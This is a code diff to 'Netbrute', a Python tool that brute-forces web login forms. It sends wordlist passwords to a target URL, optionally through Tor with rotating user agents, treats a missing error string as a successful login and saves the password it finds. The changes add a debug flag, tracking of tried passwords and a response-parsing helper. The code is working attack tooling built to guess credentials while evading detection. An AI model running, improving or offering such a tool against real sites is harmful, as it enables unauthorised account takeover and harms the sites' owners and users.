@@ -21,7 +21,8 @@ class Netbrute:
     """
     Main program class
     """
-    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string, tor=None, tor_address=None):
+    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string, tor=None, tor_address=None,
+                 debug=None):
         self.queue = Queue()
         self.attack_url = target_url
         self.error_string = error_string
@@ -30,6 +31,8 @@ class Netbrute:
         self.wordlist = wordlist
         self.found = Event()
         self.tor_use = tor
+        self.debug = debug
+        self.runned_passwords = set()
         if self.tor_use is not None and tor_address is not None:
             ip, port = parse_proxy_address(tor_address)
             self.tor_address = "http://{0}:{1}".format(ip, port)
@@ -80,8 +83,20 @@ class Netbrute:
             f.write(password)
         return
 
+    def _parse_response(self, status, response_url, passwd):
+        if status == 200 and self.error_string in response_url:
+            self.runned_passwords.add(passwd)
+        elif status == 200 and self.error_string not in response_url:
+            print("[+] Password was found: {0}".format(passwd))
+            self._store_found_password(passwd)
+            self.found.set()
+        elif status != 200:
+            print("[!] Incompatible status code: {0} | URL: {1}".format(status, response_url))
+        return
+
     async def attack_this(self, password):
-        print("Started attack!")
+        if self.debug:
+            print("Started attack!")
         headers = {
             "content-type": "application/x-www-form-urlencoded",
             "User-Agent": random.choice(ua),
@@ -96,12 +111,9 @@ class Netbrute:
                                          headers=headers, proxy="{0}".format(proxy_addr)) as response:
 
                 body, status, response_url = await response.text(), response.status, response.url
-                if status == 200 and (self.error_string not in response_url):
-                    print("[+] Password was found: {0}".format(password))
-                    self._store_found_password(password)
-                    self.found.set()
-
-                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
+                self._parse_response(status, response_url, password)
+                if self.debug:
+                    print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
                 return
 
     def _read_wordlist(self):
@@ -155,5 +167,5 @@ if __name__ == "__main__":
         session = aiohttp.ClientSession(loop=loop)
 
     net = Netbrute(session, args.url, args.payload, args.wordlist, args.error_string,
-                   tor=args.tor, tor_address=args.tor_address)
+                   tor=args.tor, tor_address=args.tor_address, debug=args.debug)
     loop.run_until_complete(net.initiate())
